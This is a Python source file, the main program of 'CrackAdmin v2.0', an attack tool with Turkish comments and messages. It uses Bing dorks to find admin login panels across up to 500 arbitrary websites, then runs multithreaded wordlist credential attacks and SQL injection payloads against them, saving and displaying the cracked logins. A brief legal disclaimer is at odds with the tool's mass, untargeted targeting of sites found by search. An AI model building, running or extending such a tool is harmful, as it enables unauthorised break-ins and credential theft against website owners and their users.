#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CrackAdmin v2.0 - Admin Panel Tester
Yalnızca yasal ve yetkili penetration testing için.
"""

import sys, os, threading, time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from config import (
    VERSION, SUCCESS_FILE, OLDSITE_FILE,
    WORDLIST_FILE, PAYLOADS_FILE
)
from modules.tui_engine      import TUI, M, RST, BOLD, BCYAN, BWHT, GRY, BGRN, BRED, YEL
from modules.wordlist_manager import WordlistManager
from modules.dork_finder      import DorkFinder
from modules.cracker          import ParallelCracker

# ── Global state ──────────────────────────────────────────────────────────────
tui     = TUI()
wl      = None
cracker = None
finder  = None
_scan_running = False


# ── Komut işleyiciler ─────────────────────────────────────────────────────────

def cmd_help():
    tui.print_help()

def cmd_status():
    tui.sep()
    tui.bullet("Sistem Durumu")
    tui.sub(f"Wordlist  : {wl.stats()['passwords']:,} şifre" if wl else "Wordlist  : yüklenmedi")
    tui.sub(f"Payloadlar: {wl.stats()['payloads']:,} SQL payload" if wl else "Payloadlar: yüklenmedi")
    old = sum(1 for _ in open(OLDSITE_FILE) if _.strip()) if OLDSITE_FILE.exists() else 0
    tui.sub(f"Taranmış  : {old} site (tekrar atlanır)")
    hits = 0
    if SUCCESS_FILE.exists():
        hits = SUCCESS_FILE.read_text().count("URL      :")
    tui.sub(f"Başarılı  : {hits} giriş")
    tui.sub(f"Versiyon  : {VERSION}")
    tui.sep()

def cmd_results():
    tui.sep()
    tui.bullet("Başarılı Girişler")
    if not SUCCESS_FILE.exists() or SUCCESS_FILE.stat().st_size == 0:
        tui.sub("Henüz başarılı giriş yok")
        tui.sep()
        return
    content = SUCCESS_FILE.read_text(encoding="utf-8")
    blocks = [b.strip() for b in content.split("="*50) if b.strip()]
    if not blocks:
        tui.sub("Henüz başarılı giriş yok")
    else:
        for b in blocks:
            tui.ok(b.split("\n")[0] if b else "")
            for line in b.split("\n")[1:]:
                if line.strip():
                    tui.sub(line.strip())
    tui.sep()

def cmd_wordlist(args=""):
    global wl
    parts = args.strip().split(None, 1)
    sub   = parts[0] if parts else ""
    extra = parts[1] if len(parts) > 1 else ""

    if sub == "add" and extra:
        added = wl.add_external(extra)
        tui.ok(f"{added:,} yeni şifre eklendi")
    else:
        s = wl.stats()
        tui.sep()
        tui.bullet("Wordlist İstatistikleri")
        tui.sub(f"Şifre sayısı : {s['passwords']:,}")
        tui.sub(f"SQL payload  : {s['payloads']:,}")
        tui.sub(f"Tahmini komb.: {s['credentials']:,}")
        tui.sub(f"Dosya        : {WORDLIST_FILE}")
        tui.sep()

def cmd_clear():
    from modules.tui_engine import clr
    clr()
    tui.print_banner()

def cmd_new():
    tui.bullet("Yeni oturum — mevcut durum sıfırlandı")

def cmd_start():
    global _scan_running, finder, cracker

    if _scan_running:
        tui.warn("Zaten bir tarama çalışıyor. /stop ile durdurun.")
        return

    # Site sayısı sor
    tui.sep()
    raw = tui.ask("Kaç site test edilsin? (1–500)", "70")
    try:
        target = max(1, min(500, int(raw)))
    except Exception:
        tui.err("Geçersiz sayı")
        return

    # Özel dork sor
    dork_raw = tui.ask("Özel dork ekle? (boş bırak = varsayılan)", "")
    custom_dorks = [d.strip() for d in dork_raw.split(",") if d.strip()] if dork_raw else []

    # Thread sayısı
    thr_raw = tui.ask(f"Max thread sayısı? (1–70, varsayılan 50)", "50")
    try:
        threads = max(1, min(70, int(thr_raw)))
    except Exception:
        threads = 50

    def _run():
        global _scan_running
        _scan_running = True
        tui.update_stats(sites=0, attempts=0, hits=0, blocked=0)

        try:
            # ── 1. Admin panelleri bul ──────────────────────────────────────
            tui.sep()
            tui.bullet(f"Admin panel taraması başlıyor — hedef: {target} site")
            tui.sys("Dorklar: Bing üzerinden aranıyor")
            tui.sep()

            finder = DorkFinder(
                log_fn    = lambda t, k="": tui.ok(t) if k=="ok" else tui.sub(t),
                stream_fn = lambda t: tui.stream(t),
            )
            tui.spin_start("Panel aranıyor")
            sites = finder.find_sites(
                target       = target,
                custom_dorks = custom_dorks,
                on_found     = lambda u: tui.update_stats(sites=len(finder.found)),
            )
            tui.spin_stop()

            if not sites:
                tui.warn("Admin panel bulunamadı. Dork listesi veya internet bağlantısı kontrol edin.")
                _scan_running = False
                return

            tui.ok(f"{len(sites)} admin panel doğrulandı")
            tui.sep()

            # ── 2. Credential taraması ──────────────────────────────────────
            tui.bullet(f"Credential taraması — {len(sites)} site × {wl.stats()['passwords']:,} şifre")
            tui.sys("Yalnızca BAŞARILI girişler gösterilecek")
            tui.sep()

            cracker = ParallelCracker(tui=tui, max_threads=threads)
            results = cracker.crack(
                sites       = sites,
                credentials = wl.get_credentials(),
                payloads    = wl.get_payloads(),
                max_threads = threads,
            )

            # ── 3. Özet ────────────────────────────────────────────────────
            tui.sep()
            tui.bullet("Tarama tamamlandı")
            tui.sub(f"Test edilen site : {len(sites)}")
            tui.sub(f"Başarılı giriş   : {len(results)}")
            if results:
                tui.ok("Başarılı girişler:")
                for r in results:
                    tui.ok(f"  {r['url']}")
                    tui.sub(f"  {r['username']}:{r['password']}")
            else:
                tui.sub("Başarılı giriş bulunamadı")
            tui.sub(f"Detaylar: {SUCCESS_FILE}")
            tui.sep()

        except Exception as e:
            tui.err(f"Tarama hatası: {e}")
        finally:
            _scan_running = False

    threading.Thread(target=_run, daemon=True).start()

def cmd_stop():
    global _scan_running
    if finder:
        finder.stop()
    if cracker:
        cracker.stop()
    _scan_running = False
    tui.warn("Tarama durduruldu")

def cmd_exit():
    tui.bullet("Çıkılıyor...")
    tui._running = False
    sys.exit(0)


# ── Komut router ──────────────────────────────────────────────────────────────

def handle_command(raw: str):
    cmd  = raw.strip()
    low  = cmd.lower()

    if low in ("/exit", "/quit", "/q"):
        cmd_exit()
    elif low == "/start":
        cmd_start()
    elif low == "/stop":
        cmd_stop()
    elif low in ("/help", "/?"):
        cmd_help()
    elif low in ("/status", "/s"):
        cmd_status()
    elif low in ("/results", "/r"):
        cmd_results()
    elif low.startswith("/wordlist"):
        args = cmd[9:].strip()
        cmd_wordlist(args)
    elif low in ("/clear", "/cls"):
        cmd_clear()
    elif low == "/new":
        cmd_new()
    else:
        tui.err(f"Bilinmeyen komut: {cmd}")
        tui.sub("/ yazarak komut listesini açın")


# ── Başlangıç ─────────────────────────────────────────────────────────────────

def _init():
    global wl
    tui.print_banner()

    # Yasal uyarı
    print(f"""
{YEL}  ⚠  YASAL UYARI{RST}
{GRY}  Bu araç yalnızca yetkili sistemlerde kullanılmalıdır.
  Yetkisiz erişim yasal değildir; kullanım sorumluluğu
  tamamen kullanıcıya aittir.{RST}
""")
    onay = tui.ask("Devam etmek için 'devam' yazın", "")
    if onay.lower() not in ("devam", "d", "yes", "y", "evet"):
        tui.err("İptal edildi.")
        sys.exit(0)

    # Modülleri yükle
    tui.spin_start("Modüller yükleniyor")
    wl = WordlistManager(log_fn=lambda t: tui.sub(t))
    tui.spin_stop()
    tui.ok("Hazır")
    tui.sub("/ yazarak komut listesini açın, /help yardım")

def main():
    if sys.version_info < (3, 6):
        print("Python 3.6+ gerekli"); sys.exit(1)

    _init()
    tui.set_callback(handle_command)
    tui.run()

if __name__ == "__main__":
    main()
